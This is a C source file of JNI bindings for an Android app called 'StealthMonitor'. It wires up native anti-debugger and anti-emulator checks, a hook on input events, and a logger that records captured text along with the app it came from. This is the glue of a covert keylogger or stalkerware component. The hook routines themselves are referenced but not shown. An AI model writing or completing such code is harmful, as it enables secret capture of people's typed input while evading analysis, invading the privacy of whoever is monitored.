#include <jni.h>
#include <android/log.h>
#include <string.h>

#define TAG "StealthMonitor"

// Declarações das funções nativas
extern int hook_input_events();
extern int is_debugger_present();
extern int is_emulator();

JNIEXPORT jboolean JNICALL
Java_com_research_stealthmonitor_utils_StealthUtils_isDebuggerPresentNative(JNIEnv *env, jclass clazz) {
    return (jboolean) is_debugger_present();
}

JNIEXPORT jboolean JNICALL
Java_com_research_stealthmonitor_utils_StealthUtils_isEmulatorNative(JNIEnv *env, jclass clazz) {
    return (jboolean) is_emulator();
}

JNIEXPORT jint JNICALL
Java_com_research_stealthmonitor_NativeBridge_startInputHook(JNIEnv *env, jobject thiz) {
    return hook_input_events();
}

JNIEXPORT void JNICALL
Java_com_research_stealthmonitor_NativeBridge_logEvent(JNIEnv *env, jobject thiz,
                                                      jstring text, jstring app) {
    const char *text_str = (*env)->GetStringUTFChars(env, text, 0);
    const char *app_str = (*env)->GetStringUTFChars(env, app, 0);
    
    __android_log_print(ANDROID_LOG_DEBUG, TAG, "Event: %s from %s", text_str, app_str);
    
    (*env)->ReleaseStringUTFChars(env, text, text_str);
    (*env)->ReleaseStringUTFChars(env, app, app_str);
}